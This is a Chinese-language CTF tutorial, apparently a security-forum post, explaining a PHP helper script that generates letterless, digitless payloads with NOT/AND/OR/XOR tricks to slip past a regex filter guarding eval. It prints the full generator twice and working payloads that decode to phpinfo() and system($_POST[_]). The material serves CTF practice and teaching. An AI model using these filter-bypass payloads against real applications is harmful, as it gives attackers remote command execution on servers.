前言
==

无字母RCE虽然在现实环境中不会出现，但是在CTF中也是常见的考点。  
笔者在CTF中遇到过不少这类题目，发现解题思路基本上都是一样的，所以萌生了开发一个辅助脚本的想法。

常规解题思路
======

核心代码如下：  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-014fa4a0859dd3e274dd5209569e597412d998fc.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-014fa4a0859dd3e274dd5209569e597412d998fc.png)  
基本不会有太大变化，主要的点就是：

- 使用正则限制了部分的字符集
- eval执行任意代码

那么**常规**的思路就是通过与、或、非、异或操作利用未被过滤的字符构造出一些关键字，然后利用php动态调用的特性绕过限制执行任意代码。

1. fuzz出没过滤的字符
2. 通过与或非异或构造出可构造的字符集
3. 在字符集中挑选字符构造关键字
4. 利用动态调用特性完成任意代码执行

这里强调的常规就是没有过滤与、或、非、异或操作符的情况，过滤了则是进阶的玩法，不在本文讨论范围。

开发过程
====

Fuzz出未过滤的字符
-----------

```php
<?php
$target = isset($_REQUEST['target']) ? $_REQUEST['target'] : "phpinfo"; // 这是想要构造的关键字，可以先无视这行。
$regx = isset($_REQUEST['regx']) ? $_REQUEST['regx'] : "/[A-Za-z0-9]/"; // 题目用的正则表达式
$white_list_chr = array(); // 存放未被过滤的字符
for ($i = 1; $i <= 255; $i++) {
    if (!preg_match($regx, chr($i))) {
        $white_list_chr[] = chr($i);
    }
}
print_r($white_list_chr);
```

第一步就是找到未被过滤的字符集，只需要遍历ascii码`0-255`的字符，逐一进行正则匹配。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0ed3de1a1c7bad6d11a1a188542f7024eb60b3e5.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0ed3de1a1c7bad6d11a1a188542f7024eb60b3e5.png)  
这样就拿到了未被过滤的字符集。

构造出可构造的字符集
----------

用未被过滤的字符作为操作数进行与、或、非、异或操作，得到的结果存起来就是可构造的字符集了。

### 单目操作

先用非作例子，它比较特殊，因为只有它是单目运算，其它的都是双目运算。

```php
<?php
...
$not_chars = array(); // 存放构造结果
if (!preg_match($regx, '~')) { // 检测是否支持非操作
    foreach ($white_list_chr as $chr) {
        $not_chars[~$chr] = ord($chr);
    }
}
print_r($not_chars);
```

首先是检测`~`有没有被过滤，不然也白构造。  
如果支持`~`运算就遍历未过滤的字符进行运算并将结果存起来。（我这里存放结果的ascii码，主要是方便观察。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-9700fb43cbb560c84f461597be8f2604c99a6084.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-9700fb43cbb560c84f461597be8f2604c99a6084.png)  
得到的结果长这样。

### 双目操作

剩下的与、或、异或大同小异，思路和非运算差不多，只不过多一层遍历。  
全部放出来

```php
<?php
...
$and_chars = array();
if (!preg_match($regx, '&amp;')) {
    foreach ($white_list_chr as $chr1) {
        foreach ($white_list_chr as $chr2) {
            $and_res = $chr1 &amp; $chr2;
            if (null === $and_chars[$and_res]) {
                $and_chars[$and_res] = array(ord($chr1), ord($chr2));
            }
        }
    }
}
print_r($and_chars);

$or_chars = array();
if (!preg_match($regx, '|')) {
    foreach ($white_list_chr as $chr1) {
        foreach ($white_list_chr as $chr2) {
            $and_res = $chr1 | $chr2;
            if (null === $or_chars[$and_res]) {
                $or_chars[$and_res] = array(ord($chr1), ord($chr2));
            }
        }
    }
}
//print_r($or_chars);

$xor_chars = array();
if (!preg_match($regx, '^')) {
    foreach ($white_list_chr as $chr1) {
        foreach ($white_list_chr as $chr2) {
            $and_res = $chr1 ^ $chr2;
            if (null === $xor_chars[$and_res]) {
                $xor_chars[$and_res] = array(ord($chr1), ord($chr2));
            }
        }
    }
}
//print_r($xor_chars);
```

因为构造字符的操作数不一定只有一对，所以加了个检测。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d5ee72e854262a52d42abdd6f3dbee6d1069ee67.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d5ee72e854262a52d42abdd6f3dbee6d1069ee67.png)  
得出的效果是这样的。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c96568be1ef4907577edffe6cb3949cefe8b1c14.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c96568be1ef4907577edffe6cb3949cefe8b1c14.png)

构造目标字符串
-------

有了可构造的字符集就可以从中挑选字符来构造目标字符串，目标字符串一般都是关键字，如：`phpinfo`/`system`/`_GET`/`_POST`。

我们只需要遍历目标字符串的每个字符然后从可构造字符集中取出对应的操作数，由于我存放的是ascii码所以要转为字符再拼接起来，得到的结果暂且叫做操作字符串。如果遍历到某个字符没有操作数说明该字符无法构造，此路不通直接break。  
以非操作为例：

```php
<?php
...
$not_op = ""; // 操作字符串
for ($i = 0; $i < strlen($target); $i++) {
    if ($not_chars[$target[$i]] === null) {    // 构造不出该字符。
        $not_op = "Fail.";
        break;
    }
    $not_op .= chr($not_chars[$target[$i]]);
}
```

其它的操作大同小异。

```php
<?php
...
$and_op_left = ""; // 左操作字符串
$and_op_right = ""; // 右操作字符串
for ($i = 0; $i < strlen($target); $i++) {
    if ($and_chars[$target[$i]] === null) {    // 构造不出该字符。
        $and_op_left = "Fail.";
        $and_op_right = "Fail.";
        break;
    }
    $and_op_left .= chr($and_chars[$target[$i]][0]);
    $and_op_right .= chr($and_chars[$target[$i]][1]);
}

$or_op_left = "";
$or_op_right = "";
for ($i = 0; $i < strlen($target); $i++) {
    if ($or_chars[$target[$i]] === null) {    // 构造不出该字符。
        $or_op_left = "Fail.";
        $or_op_right = "Fail.";
        break;
    }
    $or_op_left .= chr($or_chars[$target[$i]][0]);
    $or_op_right .= chr($or_chars[$target[$i]][1]);
}

$xor_op_left = "";
$xor_op_right = "";
for ($i = 0; $i < strlen($target); $i++) {
    if ($xor_chars[$target[$i]] === null) {    // 构造不出该字符。
        $xor_op_left = "Fail.";
        $xor_op_right = "Fail.";
        break;
    }
    $xor_op_left .= chr($xor_chars[$target[$i]][0]);
    $xor_op_right .= chr($xor_chars[$target[$i]][1]);
}
```

这样就得到了与或非异或操作的操作字符串：

```php
$not_op,$and_op_left,$and_op_right,$or_op_left...
```

最后就需要将这些包含奇奇怪怪的字符的结果进行url编码然后展示出来，我个人就选用了html展示。

```php
<form method="post">
    <p>Build for : <input name="target" value="<?php echo $target; ?>"></p>
    <p>Regx : <input name="regx" value="<?php echo $regx; ?>"></p>
    <p>
        <button type="submit">Submit</button>
    </p>
</form>

<p><b>Build via not</b></p>
<p>not_op : <input value="<?php echo urlencode($not_op); ?>"></p>

<p><b>Build via and</b></p>
<p>and_op_left : <input value="<?php echo urlencode($and_op_left); ?>"></p>
<p>and_op_right : <input value="<?php echo urlencode($and_op_right); ?>"></p>

<p><b>Build via or</b></p>
<p>or_op_left : <input value="<?php echo urlencode($or_op_left); ?>"></p>
<p>or_op_right : <input value="<?php echo urlencode($or_op_right); ?>"></p>

<p><b>Build via xor</b></p>
<p>xor_op_left : <input value="<?php echo urlencode($xor_op_left); ?>"></p>
<p>xor_op_right : <input value="<?php echo urlencode($xor_op_right); ?>"></p>

```

整体效果：  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-77fb13f0b02eb75f11bc816fdfb02a87afbb15c4.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-77fb13f0b02eb75f11bc816fdfb02a87afbb15c4.png)  
辅助脚本到此就开发完毕了。

实际应用
====

回到开头的题目  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-014fa4a0859dd3e274dd5209569e597412d998fc.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-014fa4a0859dd3e274dd5209569e597412d998fc.png)  
这就是很经典的无字母甚至连数字也没有的RCE题目。  
只需要将题目中的正则表达式和目标字符串填入辅助脚本并提交就可以得到构造结果。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6ff7d8cb66c68ad104fa1c29f8efdd081b5080d6.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6ff7d8cb66c68ad104fa1c29f8efdd081b5080d6.png)  
再结合php动态调用特性来构造payload：

```php
(~%8F%97%8F%96%91%99%90)(); // phpinfo();
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0a88ff9071782326e7da8656a94d587d2937cc62.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0a88ff9071782326e7da8656a94d587d2937cc62.png)  
先执行一手`phpinfo`看看disable\_func的过滤情况：  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8f6a8ccd2f7fdcd6b22c179fb58eef8896788a3d.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8f6a8ccd2f7fdcd6b22c179fb58eef8896788a3d.png)  
没有过滤就起飞了。构造一手`system`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4ca0d5f9e26aa99a99735dc45407e539975f2069.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4ca0d5f9e26aa99a99735dc45407e539975f2069.png)  
和`_POST`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c150d08d18642b182e782c9ed50303302c85111b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c150d08d18642b182e782c9ed50303302c85111b.png)  
再根据动态调用构造payload：

```php
$_=(~%A0%AF%B0%AC%AB);(~%8C%86%8C%8B%9A%92)($$_[_]); // system($_POST[_]);

```

因为payload可能包含一些特殊字符如`=` `&`，所以也需要url编码一下。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a5a8c9950767e04b97bcec32a896c48d636b9641.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a5a8c9950767e04b97bcec32a896c48d636b9641.png)  
这样得到了任意命令执行。

小提示
---

构造结果是由正则表达式和目标字符串决定的，其中有可能出现一些特殊字符影响代码的语义，所以需要根据情况进行调整。  
以本题为例子，选用`&`操作得到的结果进行payload构造

```php
$_=("_%5B_%5B%5C"&amp;"_%D0%CF%D3%D4");(~%8C%86%8C%8B%9A%92)($$_[_]);

```

其中的`=`和`&`需要进行url编码  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2d913f61e44446288748fbc372025c684fb93285.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2d913f61e44446288748fbc372025c684fb93285.png)  
发送后发现没有执行成功。  
调试跟入  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c0f9aa0ed2411fd8153c6f49ea8626151f078d5e.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c0f9aa0ed2411fd8153c6f49ea8626151f078d5e.png)  
发现payload中含有`\`字符，影响了代码的语义。  
那么此时可以尝试换一个payload，只需在正则中添加`\`的过滤，然后计算出新payload。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-bd4c626da40f69b9269657ccde5fd3b24b3bc92b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-bd4c626da40f69b9269657ccde5fd3b24b3bc92b.png)  
使用新payload调试可以看到成功得到了`_POST`。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0e39d2ac4bf5d620231a98d086c152d189400d91.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0e39d2ac4bf5d620231a98d086c152d189400d91.png)  
成功执行系统命令。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-123ca5022a2329573bc86d14890ecce7e965d5ff.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-123ca5022a2329573bc86d14890ecce7e965d5ff.png)  
如果添加了`\`的过滤后计算不出payload也别慌，在`\`前面再添加一个`\`把它转义掉就行了，很简单的道理。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5452423cf515f22198b6a64598b7f95bc641e862.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5452423cf515f22198b6a64598b7f95bc641e862.png)  
成功构造出`_POST`。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-133e15d67e4982247a394d5e3803c4a7c254d70c.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-133e15d67e4982247a394d5e3803c4a7c254d70c.png)  
不仅只有`\`，像`"`/`'`/`)`都有可能影响payload的语义，具体的要看情况进行调整，这里只是提供一个解决思路。

后记
==

这类题目最根本的还是考察对PHP代码特性的了解和变通能力。而这个脚本旨在快速检测出某正则过滤下可采用的构造方式与能构造的字符串，它还需要结合调试进行适当的调整才能解决题目，这就是我更愿意称它为辅助脚本的原因。那么如果检测出来全部是`Fail.`的情况，就可以考虑非常规的进阶玩法了。

参考资料
====

<https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html>  
<https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html>

附录
==

```php
<?php
$target = isset($_REQUEST['target']) ? $_REQUEST['target'] : "phpinfo";
$regx = isset($_REQUEST['regx']) ? $_REQUEST['regx'] : "/[A-Za-z0-9]/";
$white_list_chr = array();
for ($i = 1; $i <= 255; $i++) {
    if (!preg_match($regx, chr($i))) {
        $white_list_chr[] = chr($i);
    }
}
//print_r($white_list_chr);

$not_chars = array();
if (!preg_match($regx, '~')) {
    foreach ($white_list_chr as $chr) {
        $not_chars[~$chr] = ord($chr);
    }
}
//print_r($not_chars);

$and_chars = array();
if (!preg_match($regx, '&amp;')) {
    foreach ($white_list_chr as $chr1) {
        foreach ($white_list_chr as $chr2) {
            $and_res = $chr1 &amp; $chr2;
            if (null === $and_chars[$and_res]) {
                $and_chars[$and_res] = array(ord($chr1), ord($chr2));
            }
        }
    }
}
//print_r($and_chars);

$or_chars = array();
if (!preg_match($regx, '|')) {
    foreach ($white_list_chr as $chr1) {
        foreach ($white_list_chr as $chr2) {
            $and_res = $chr1 | $chr2;
            if (null === $or_chars[$and_res]) {
                $or_chars[$and_res] = array(ord($chr1), ord($chr2));
            }
        }
    }
}
//print_r($or_chars);

$xor_chars = array();
if (!preg_match($regx, '^')) {
    foreach ($white_list_chr as $chr1) {
        foreach ($white_list_chr as $chr2) {
            $and_res = $chr1 ^ $chr2;
            if (null === $xor_chars[$and_res]) {
                $xor_chars[$and_res] = array(ord($chr1), ord($chr2));
            }
        }
    }
}
//print_r($xor_chars);

$not_op = "";
for ($i = 0; $i < strlen($target); $i++) {
    if ($not_chars[$target[$i]] === null) {    // 构造不出该字符。
        $not_op = "Fail.";
        break;
    }
    $not_op .= chr($not_chars[$target[$i]]);
}

$and_op_left = "";
$and_op_right = "";
for ($i = 0; $i < strlen($target); $i++) {
    if ($and_chars[$target[$i]] === null) {    // 构造不出该字符。
        $and_op_left = "Fail.";
        $and_op_right = "Fail.";
        break;
    }
    $and_op_left .= chr($and_chars[$target[$i]][0]);
    $and_op_right .= chr($and_chars[$target[$i]][1]);
}

$or_op_left = "";
$or_op_right = "";
for ($i = 0; $i < strlen($target); $i++) {
    if ($or_chars[$target[$i]] === null) {    // 构造不出该字符。
        $or_op_left = "Fail.";
        $or_op_right = "Fail.";
        break;
    }
    $or_op_left .= chr($or_chars[$target[$i]][0]);
    $or_op_right .= chr($or_chars[$target[$i]][1]);
}

$xor_op_left = "";
$xor_op_right = "";
for ($i = 0; $i < strlen($target); $i++) {
    if ($xor_chars[$target[$i]] === null) {    // 构造不出该字符。
        $xor_op_left = "Fail.";
        $xor_op_right = "Fail.";
        break;
    }
    $xor_op_left .= chr($xor_chars[$target[$i]][0]);
    $xor_op_right .= chr($xor_chars[$target[$i]][1]);
}

?>
<form method="post">
    <p>Build for : <input name="target" value="<?php echo $target; ?>"></p>
    <p>Regx : <input name="regx" value="<?php echo $regx; ?>"></p>
    <p>
        <button type="submit">Submit</button>
    </p>
</form>

<p><b>Build via not</b></p>
<p>not_op : <input value="<?php echo urlencode($not_op); ?>"></p>

<p><b>Build via and</b></p>
<p>and_op_left : <input value="<?php echo urlencode($and_op_left); ?>"></p>
<p>and_op_right : <input value="<?php echo urlencode($and_op_right); ?>"></p>

<p><b>Build via or</b></p>
<p>or_op_left : <input value="<?php echo urlencode($or_op_left); ?>"></p>
<p>or_op_right : <input value="<?php echo urlencode($or_op_right); ?>"></p>

<p><b>Build via xor</b></p>
<p>xor_op_left : <input value="<?php echo urlencode($xor_op_left); ?>"></p>
<p>xor_op_right : <input value="<?php echo urlencode($xor_op_right); ?>"></p>

```